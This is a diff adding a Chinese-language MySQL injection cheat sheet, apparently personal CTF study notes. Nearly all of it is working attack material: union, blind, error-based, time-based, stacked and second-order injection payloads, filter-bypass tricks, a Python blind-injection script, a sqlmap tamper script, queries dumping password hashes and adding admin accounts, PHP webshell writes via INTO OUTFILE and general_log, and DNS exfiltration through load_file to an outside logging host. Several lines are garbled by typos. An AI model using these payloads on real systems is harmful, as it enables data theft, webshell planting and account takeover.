@@ -1,0 +1,497 @@
+		
+												mysql注入流程
+		
+	判断注入：
+		1 and 1=1
+		1 and 1=2   
+		1' and '1'='1'--+
+		1' and '1'='2'--+
+		1' or '123'='123--+  //判断数字型还是字符型
+		
+	 搜索型注入
+		SELECT * FROM user  where username like '%$keywords%'
+		检测方式:
+		1.搜索keywords'，如果出错的话，有90%的可能性存在漏洞；
+		2.搜索keywords%，如果同样出错的话，就有95%的可能性存在漏洞；
+		3.搜索keywords%' and 1=1 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=1）看返回的情况
+		4.搜索keywords%' and 1=2 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=2）看返回的情况
+		5.根据两次的返回情况来判断是否为搜索型文本框注入
+				
+				
+		
+	当返回不同结果时考虑union查询
+			判断列
+			1' order by 3--+ 出错     //当 order by 被过滤时，无法猜解字段数，此时可以使用 into 变量名进行代替。select * from users where id=1 into
+			1' order by 1--+
+			union select 1,2  //假设回显点在2上
+			-1' union select 1,version()--+
+			1' union seLect 1,database() --+
+			1' union select 1,table_name from information_schema.tables where table_schema='ctfshow_web' --+
+			1' union select 1,column_name from information_schema.columns where table_name='ctfshow_user' --+
+			1'union seLect 1,password from ctfshow_user2 --+
+			
+			#查看当前数据库
+			id=-1' union select 1,2,(select database()) --+ 
+			#查看所有数据库
+			id=-1' union select 1,2,group_concat(schema_name)from information_schema.schemata --+ 
+			#查看 ctfshow_web数据库下的所有表名字
+			id =-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+ 
+			id =-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23 
+			#查看 ctfshow_user3 表下字段
+			id =-1'union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='ctfshow_user3'--+ 
+			#获取 ctfshow_web库ctfshow_user3表下所有字段
+			id =-1'union select 1,2,group_concat(column_name) from  information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user3'--+ 
+			# cat flag
+			id = -1' union select 1,2,(select password from ctfshow_user3 where username='flag') %23
+
+			第一个表
+			-1' union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)--+ //group_concat被过滤用limit
+			第二个表 
+			-1' union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)--+ 
+			第一个字段名 
+			-1' union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1))--+  
+			第二个字段名 
+			-1' union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 2,1))--+ 
+			获取 users 表第三个字段名 
+			-1' union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 3,1))--+
+			
+			或者运用if
+			1' and if(1=1,1,0)--+
+			判断数据库第一个字是不是字符 d，如果是返回 1 否则返回 0
+			select if(SUBSTRING(database(),1,1)='d',1,0) 判断数据库第一个字是不是字符 d，如果是返回 1 否则返回 0
+			判断第二个字符
+			select if(SUBSTRING(database(),2,1)='v',1,0) 第二个字符为 v。如此类推
+			要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。
+			1' and if(length(database())=4,1,0)--+ 
+			得到库名接着获取表名
+			1'and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0)--+
+			1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1,1),1,1)='u',1,0)--+
+			1'and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)='a',1,0)--+
+			显示当前库，原理是 SELECT first_name, last_name FROM users WHERE user_id = '1' and info()-- 会报错显示当前库不存在这个函数 这样当前库名就显示在页面上
+			输入 1'and info()--+ 
+			1'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
+	
+	
+	
+	完全过滤union但有回显
+		尝试布尔盲注
+		1 and 1=1   1 and 1=2   1' and 1=1  1' and 1=2 思路是截断加比较，再替换要求的过滤
+		表名
+
+		截断
+		substr(a from b for c) //a字符串从b位置（1是开始）取c长度
+		mid(a,b,c) 		//一样
+		right(a,b)		//字符串a的后b位 一般要套用ascii()函数 ascii(right('',1))改变1即可 同理ascii(reverse(left('abc',1)))
+		ascii(a)		//返回字符串a的第一位的ascii与ord同名
+		insert(a,b,c,d)//字符串a的第b位后c个替换成字符串d,payload:insert((insert('',1,从0开始更改位数),2,999999)//结果是截取的字符
+		trim()//常用payload是trim(leading <i> from '')=trim(leading <i+1> from '')
+		比较
+		><		//
+		like	//不用%就是=用like'ab%'%匹配任意字符
+		regexp	//匹配regexp "^ctf" 以ctf为起始是否匹配
+		rlike	//匹配
+		in		//
+		and		//1 and ascii('a')-97答案是0
+		between//
+		异或解决过滤注释符例如'1'^(布尔表达式)^'1'还有'1'-(布尔表达式)-'1'等
+		
+	
+		
+		尝试加入 -0 / '判断报错注入
+			查看当前数据库用户			
+			' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+			数据库名
+			1' and info()--+
+            1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
+			获取 mysql 账号和密码,获取账号和密码需要 root 用户才有足够大的权限
+			select authentication_string from mysql.user limit 1;
+			select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit
+			1 )),0x7e),1))
+			select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from
+			mysql.user limit 1),32,40))),0x7e),1))
+			查询第一个表名
+			1' and (select 1 from(select count(*),concat((select (select (SELECT distinct
+			concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database()
+			LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
+			information_schema.tables group by x)a)--+
+			将 LIMIT 0,1 改成 1,1 表是第二个表名
+			1' and (select 1 from(select count(*),concat((select (select (SELECT distinct
+			concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database()
+			LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
+			information_schema.tables group
+			获取第一个字段名
+			1' and (select 1 from(select count(*),concat((select (select (SELECT distinct
+			concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name='users' LIMIT
+			0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
+			information_schema.tables group by x)a)--+
+			获取第二个字段名
+			1' and (select 1 from(select count(*),concat((select (select (SELECT distinct
+			concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name='users' LIMIT
+			1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from
+			information_schema.tables group by x)a)--+
+			有表的名字和它的字段名，接下来可以对内容进行查询。
+			1' and (select 1 from(select count(*),concat((select (select (SELECT distinct
+			concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables
+			limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+			如果存在多个用户 把 limit 0,1 改成 1,1 如此类推知道获取最后一个用户为止
+			查数据库
+			' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) --+
+			' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1) --+
+			' and updatexml(l,concat(0x7e,(select schema name from information_schema.schemata limit 2,1),0x7e),1) --+
+			' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)--+|
+			' and updatexmI(1,concat(Ox7e,(select group concat(table name) from information schema tables where table schema= 'mysql'),0x7e). 1)--
+			•有一点将要注意，updatexml能查字符串的最大长度为32，就足说如果我们想要的结果超过32，就离要用substring0的数花取，一次查着32位
+			•这里查询前5位；
+			'and updatexml(1,concat(0x7e,substring(hex(select database()),1,5),0x7e),1)
+			'and updatexml(1,concat(0x7e,substring(hex(select group_concat(schema_name) from information_schema.schemata)),1,5),0x7e),1)--+		
+		
+		
+			报错函数
+				1.floor() 
+				select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); 
+				2.extractvalue() 
+				select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 
+				3.updatexml() 
+				select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 
+				4.geometrycollection() 
+				select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); 
+				5.multipoint() 
+				select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); 
+				6.polygon() 
+				select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); 
+				7.multipolygon() 
+				select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); 
+				8.linestring() 
+				select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); 
+				9.multilinestring() 
+				select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); 
+				10.exp() 
+				select * from test where id=1 and exp(~(select * from(select user())a))
+			
+		exp(709+(1=1))	//假正常
+		cot(0+(1=2))
+		pow(1+(1=2),99999999)
+		expdataxml(a,b,c)	/b是注入语句
+		extractvalue(a,b)//
+		
+		
+		1' and 1=1 
+		1' and 1=2结果一样
+		尝试延时注入
+			if((布尔判断)，sleep(5),0)
+			id=1 and sleep(5)判断下是否存在延迟注入
+			查表名
+			and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table schema=‘jian' limit0,1),'.请输入dsn地址\\abc’))),1,1)--+    
+			benchmark(30000000*(1=1),sha1('uert'))相当于sleep
+
+		尝试堆叠注入
+		   堆叠查询只能返回第一条查询信息，不返回后面的信息，堆叠注入的危害是很大的 可以任意使用增删改查的语句，例数据库 修改数据库，添加数据库用户。
+			先确定是否存在注入
+			id=1' and 1=2--+ id=1' and 1=1--+
+			接着使用使用堆叠语法进行检测
+			-999' union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where
+			TABLE_SCHEMA=database() limit 1)--+
+			把库里所有的表获取出来，再获取字段
+			-999' union select 1,2,(select group_concat(column_name) from information_schema.columns where
+			TABLE_NAME='users' limit 1)--+
+			知道表的列的情况下使用 insert into 插入语句进行增加账号。如果是管理表 直接添加管理员账号即可
+			登录后台。
+			id=-999';insert into users(id,username,password)values(1000,'moonsec','123456')--+
+			访问 1000 即可访问到刚刚添加的账
+							
+		
+	
+		
+		
+		
+		
+		暴力注入：
+			通过 infomation_schema 查询 www_dvwa_com 库里所有的表和字段
+			select * from information_schema.`COLUMNS` where TABLE_SCHEMA='www_dvwa_com'
+			猜数据库：
+			1' union select 1,database()--+
+			猜表名：
+			1' union select 1,group_concat(table_name) from information_schema.tables where table_schema
+			=database()--+
+			1' union select 1,group_concat(column_name) from information_schema.columns where table_name
+			=0x7573657273#
+			1' union select 1,group_concat(column_name) from information_schema.columns where table_name
+			='users'#
+			猜用户数据：
+			1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from
+			users #
+			1' union select null,concat_ws(char(32,58,32),user,password) from users #
+			1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #
+			猜 root 用户：#
+			1' union select 1,group_concat(user,password) from mysql.user#
+
+		文件读写
+				show variables like "secure_file%"看值null不读写，目录只能在目录，无就随便
+				load_file('/') //
+				"" into outfile "目录"
+				"" into dumpfile "目录"
+		为null时不行尝试堆叠注入	
+			
+	
+	协议头注入
+	比如在注册用户的时候插入注册的ip之类的情况…
+    SQL语句为：INSERT INTO user (username,password,ip,time) VALUES ('$username','$password','$ip','$time')
+    利用语句：X-Forwarded-For:1',database())#
+							1',(select flag from flag))#
+
+	limit注入
+		SELECT * FROM user  limit 0,$id;
+		在LIMIT后面可以跟两个函数PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢？
+		select username from user where id >0 order by id limit 0,1 procedure analyse(1);
+		可以通过结合报错来获取我们需要的信息，可以看到下面语句分别执行并通过报错回显了。
+		1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+		1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)
+		1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'))),1)
+		1 procedure analyse(extractvalue(rand(),concat(0x3a,(select flag from flag))),1)%23
+		查看版本：select username from user where id >0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+		查看当前库的表名：select username from user where id >0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1);
+	order by注入
+		order by是MYSQL中对查询数据进行排序的方法，示例：
+		select * from 表名 order by 列名(或者数字) asc；
+		这里的重点在于order by后既可以填列名或者是一个数字。如：id是user表的第一列的列名，那么如果想根据id来排序，有两种写法:
+		第一种：select * from user order by id;
+		第二种：select * from user order by 1;
+		于是可以使用rand()函数进行盲注，类似于布尔注入。
+		查询数据库：select * from user order by rand(substr(database(),1,1)='m');
+		查询表名：select * from user order by rand(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='u');	
+	堆叠注入
+		1';show tables;# 查询所有表
+		';handler `1919810931114514` open;handler `1919810931114514` read first#
+	 宽字节注入
+		利用`%df`可以成功闭合，输入`1%df' or 1=1#`回显所有的数据	
+	
+	注册覆盖(二次注入)
+		注册一个用户，用户名为admin '#，密码可以随意
+		登录后进行修改密码的操作：比如前面所注册的`admin '#`账号，在注册时，后端对其进行了转义（ addslashes() 或者mysql_real_escape_string和mysql_escape_string  等），`'#`被转义成了其他的东西，所以一次注入无效。 但是在保存进数据库的时候，还是`admin '#`。
+		那么修改密码时的语句如下：
+		update users set  password='123' where username='admin '#'
+		所以虽然修改的是`admin '#`的账号，但是数据库理解成要修改密码的账号是`admin`。
+		然后登录admin用户，可以直接获取到flag。
+		
+		获取表名
+		1"||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))#
+		获取列名
+		1"||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')%26%26(table_schema=database())))))#
+		获取数据
+		1"||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)))))#
+		1"||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^R'))))#
+	handler绕过
+		依旧是参考强网杯的例题，但是对handler进行了过滤，不能够在用上面的解法了。
+		不过可以利用预处理获取到flag
+		- prepare…from…是预处理语句，会进行编码转换。
+		- execute用来执行由SQLPrepare创建的SQL语句。
+		- SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
+		-1';Set @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
+		或
+		-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare flag from @sql;EXECUTE flag;#
+
+				
+#coding:utf-8
+import requests
+import string
+url = 'http://192.168.13.140:8015/index.php'
+dic = '{'+'-'+'_'+'}'+string.ascii_letters
+res =''
+for i in range(1,50):
+    for j in dic:
+        payload={
+            # 'order':'rand(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={})'.format(i,ord(j)) #表名
+            # 'order':'rand(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\'flag\'),{},1))={})'.format(i,ord(j)) #字段名
+            'order':'rand(ascii(substr((select flag from flag),{},1))={})'.format(i,ord(j)) #获取flag
+        }
+        r = requests.post(url,data=payload)
+        if '<tr><td>5</td><td>flagflag</td><td>ctf{fake_flag</td></tr><tr><td>4<' in r.text:
+            res+=j
+            print(res)
+            break
+
+	DNS外带查询(windows环境)
+		构造语句:select load_file(concat('\\\\',(select database()),'.0ox095.ceye.io\\sql_test';
+		其中load_file的地址为一个远程文件，MySQL在load_file()一个远程文件时会发送dns请求包去解析，所以可以带出数据，'.0ox095.ceye.io\\sql_test'，0ox095.ceye.io为自己的DNS服务器名，可以去 ceye.io申请一个或者可以利用dnslog.cn的环境。
+
+	SQL注入-文件操作
+		读文件：load_file()/load data infile
+		0 union select 1,load_file('/flag'),3,4#
+		0 union select 1,'<?php eval($_POST[\'1\']);?>',3,4 into outfile '/var/www/html/1.php'#
+
+		条件：
+			当 mysql secure_file_priv 配置项为空（空是""而不是NULL，NULL代表不可读取），或者指定的一个目录时，即可读取文件。
+		利用方式：select load_file("/flag");
+		利用方式：
+			得有一个数据表，里头的字段能够存放的进我们要读取的文件:
+			使用 load data infile 语句读取指定文件内容，并存入数据表
+		写文件：select into outfile/general log
+		条件：
+			当 mysql secure_file_priv 配置项为空（空是""而不是NULL，NULL代表不可读取），或者指定的一个目录时，即可读取文件。
+		利用方式：select "<?php @eval($_POST['x']);?>" into outfile "/tmp/11.txt";
+		利用方式：
+			查看general log状态：show variables like "%general%";
+			一般 general_log 默认是关闭的，不过这个配置可以手动开起来。mysql 默认日志输出类型不是 FILE 而是TABLE，如果是TABLE的话，是不会将日志输出为文件格式的，需要将其类型设置为FILE：show variables like "%log_output%";和set global log_output="FILE";
+			设置输出文件路径：set global general_log_file="/var/www/html/zzc.php";
+			开启 general log：set global general_log=on;
+
+	SQL特性利用
+		1.SQL对于大小写不敏感
+		eg：select username from user where id=1 Union Select version();
+		2.字符串可以利用16进制表示
+		eg：select username from user where id=1 union select 0x68656C6C6F;
+		3.可以利用/**/代替空格。
+		eg：select/**/username/**/from/**/user/**/where/**/id=1/**/union/**/select/**/version();
+		关键字
+			1.大小写绕过
+			 id=-1' Union Select version()
+			2.二次重写
+			 id=-1' UnunionIoN Seselectlect version()
+			3.等价替换
+			将table_schema='dvwa'替换为table_schema=database()
+			like替换=
+			4.编码绕过：利用urlencode，ascii(char)，hex，unicode等编码绕过
+			id=-1%27%20%55nION%20%53ElecT%20version()
+			5.插入注释：U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
+			id=-1' U/**/NION/**/ SE/**/LECT version()
+			等价替换常用:
+			hex()、bin() ==> ascii()
+			sleep() ==>benchmark()
+			concat_ws()==>group_concat()
+			mid()、substr() ==> substring()
+			@@user ==> user()
+			@@datadir ==> datadir()
+			举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　
+			或者：
+			substr((select 'password'),1,1) = 0x70
+			strcmp(left('password',1), 0x69) = 1
+			strcmp(left('password',1), 0x70) = 0
+			strcmp(left('password',1), 0x71) = -1
+        逗号
+			1.对于substr()和mid()这两个方法可以使用from for的方式来解决
+			select substr(database() from 1 for 1);
+			2.使用join：
+			union select 1,2; <=> union select * from (select 1)a join (select 2)b;
+			3.使用like
+			select ascii(mid(user(),1,1))=114; <=> select user() like 'r%';
+			4.对于limit可以使用offset来绕过：
+			select * from user limit 0,1; <=> select * from user limit 1 offset 0;
+	
+	SQLMAP
+		一般注入流程:
+		 python sqlmap.py -u "注入点URL" (未加""默认只检测第一个参数，加""默认检测URL所有参数)
+		列举数据库:
+		 python sqlmap.py sqlmap -u "注入点URL" --dbs  #列举全部数据库
+		 python sqlmap.py -u "注入点URL" --current-db  #列举当前使用的数据库
+		查询某一数据库的所有表名:
+		 python sqlmap.py -u "注入点URL" -D 数据库名 --tables
+		列举这一数据库的表的所有列（字段）:
+		 python sqlmap.py -u "注入点URL" -D 数据库名 -T 表名 --columns
+		获取所有的数据:
+		 python sqlmap.py -u "注入点URL" -D 数据库名 -T 表名 -C "查询的字段名" --dump
+		tamper脚本编写demo--sqlmap双写绕过脚本double.py:
+			#!/usr/bin/env python
+			#coding: utf-8
+			from lib.core.compat import xrange
+			from lib.core.enums import PRIORITY
+			__priority__ = PRIORITY.LOW
+			def dependencies():
+				pass
+			def tamper(payload, **kwargs):
+			payload= payload.lower()
+			payload= payload.replace('select' , 'selselectect')
+			payload= payload.replace('and' , 'anandd')
+			payload= payload.replace('or' , 'oorr')
+			retVal=payload
+			return retVal	
+
+
+
+
+
+	
+version() mysql 版本
+database() 当前数据库
+user() 当前用户名
+group_concat()分组打印字符串
+
+payload:
+万能密码 1' or 1=1 --+
+-1' union select 1,(select concat(username,password) from ctfshow_user2 where username='flag')--+
+1' union select id,hex(username),password from ctfshow_user3 --+		//因为字段中不允许出现flag  所以直接把字段改成hex()格式 ，这样就避开 了或者to_base64()
+-1' union select replace(username,'g','j'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J'),'g','j') from ctfshow_user4 where username='flag'--+  //将数字换为字母
+-1'union%0aselect(1),2,(password)from(ctfshow_user)where(username)='flag
+-1'union%0cselect(1),2,(password)from(ctfshow_user)where(username)='flag
+			过滤了flag，模糊查询
+-1'%0cor%0cusername%0clike'fla%
+
+过滤了 ascii 0-127尝试从其他信道将数据带出利用into outfile来实现文件的输出if(!preg_match(‘/[\x00-\x7f]/i’, json_encode($ret))){
+-1' union select 1,from_base64('%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b') into outfile '/var/www/html/1.php'
+写shell
+?id=1' union select 1,'<?php eval($_POST[1]);?>' into outfile '/var/www/html/1.php'+--+
+从phpinfo里获得数据库密码，连接数据库
+
+没有空格和 select 可以用，这里利用逻辑运算的优先级构造 and 语句，绕过查询语句前面的 username != flag，且不能含有空格
+关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果
+思路
+where username !='flag' and id = ''or(id=26)and'1'='1' limit 1
+where (username !='flag' and id = '')or(id=26 and'1'='1') limit 1
+因为or的存在，相当于要select两次，但又因为or左边是为0的，右边为id=26，所以只select右边
+完整的sql语句变为：select id,username,password from ctfshow_user where id=26 limit 1使用 () 或 ` 代替 空格
+'or(id=26)and'1'='1
+-1'%0cor%0cusername%0clike'%fla%
+
+?id=' UNION ALL SELECT 1,2,'<?php echo 123;eval($_POST[0]);?>',3 into outfile '/var/www/html/1.php' %23
+?id=' UNION ALL SELECT 1,2,'<?php echo 123;eval($_POST[0])?>',3 into dumpfile '/var/www/html/1.php' %23
+or and xor not 过滤绕过and = && or = ||　　xor = | # 　　not = ！
+
+=号过滤绕过
+=号和不加通配符的 like 是一样的。
+还可以使用 < >号来绕过，<> 在mysql中等于!= 如果在加一个! 双重否定代表肯定 就是=了
+大小写绕过
+``()%0a%0c替换换行符
+逃逸：u='\' and p=' or 1=1' //or会作为分割指令
+
+(过滤空格
+%09 %0a %0d %0c /**/  +
+-1'or(username)='flag
+1'or(id)='26
+
+
+
+对传入的参数进行了过滤
+function waf($str){
+return preg_match(‘/*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|#|\x23|[0-9]|file|=|or|\x7c|select|and|flag|into|where|\x26|’|"|union|`|sleep|benchmark/i’, $str);
+}
+过滤数字
+false	0
+true	1
+true+true	2
+floor(pi())	3
+ceil(pi())	4
+floor(pi())+true	5
+floor(pi())+floor(pi())	6
+floor(pi())+ceil(pi())	7
+ceil(pi())+ceil(pi())	8
+floor(pi())*floor(pi())	9
+floor(pi())*floor(pi())+true	10
+
+
+//检查结果是否有flag
+if($row->username!==‘flag’){
+$ret[‘msg’]=‘查询成功’;
+}
+添加限制条件 name!=‘flag’ 输出的username中不能有flag
+法一
+联合查询注入 只返回password
+-1' union select 1,(select password from ctfshow_user2 where username = 'flag') --+
+
+法二
+利用编码解决：base64 to_base64()、hex hex()
+这里针对的是id = ‘“.$_GET[‘id’].”’，双引号是包括在内的，可能只是起解析作用
+-1' union select to_base64(username),to_base64(password) from ctfshow_user2 --+
+
+官方视频
+999' union select id, password from ctfshow_user2 where username = 'flag
+999' union select b.id,b.password from ctfshow_user2 as b where b.username='flag
+
